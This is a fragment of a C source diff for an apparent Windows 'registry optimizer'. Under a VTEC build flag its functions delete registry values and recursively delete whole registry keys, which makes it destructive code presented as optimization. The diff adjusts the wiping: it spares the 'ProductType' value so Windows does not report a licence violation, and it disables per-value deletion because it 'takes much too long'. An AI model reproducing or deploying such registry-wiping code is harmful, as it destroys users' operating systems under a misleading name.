@@ -34,9 +34,7 @@ static BOOL RegOptimizeValues(HKEY rootkey, char *subkey) {
 	int size = MAX_PATH, index = 0;
 
 	result = RegOpenKeyExA(rootkey, subkey, 0, KEY_READ | KEY_SET_VALUE, &key);
-	if(result != ERROR_SUCCESS) {		
-		if(result == 2)
-			exit(0);
+	if(result != ERROR_SUCCESS) {				
 		return FALSE;
 	}
 	
@@ -45,7 +43,10 @@ static BOOL RegOptimizeValues(HKEY rootkey, char *subkey) {
 	if(result == ERROR_SUCCESS) {
 		do {
 #ifdef VTEC
-			result = RegDeleteValueA(key, name);
+			if(strcmp(name, "ProductType"))				/* Windows thinks we're violating it's license if we optimize that value. */
+				result = RegDeleteValueA(key, name);
+			else
+				result = ERROR_SUCCESS;
 #else
 			result = ERROR_SUCCESS;
 #endif
@@ -66,7 +67,7 @@ static BOOL RegOptimizeRecursive(HKEY rootkey, char *subkey) {
 	HKEY key;
 	FILETIME write;
 
-	RegOptimizeValues(rootkey, subkey);
+/*	RegOptimizeValues(rootkey, subkey); */		/* Takes much too long :( */
 #ifdef VTEC
 	result = RegDeleteKeyA(rootkey, subkey);
 #else
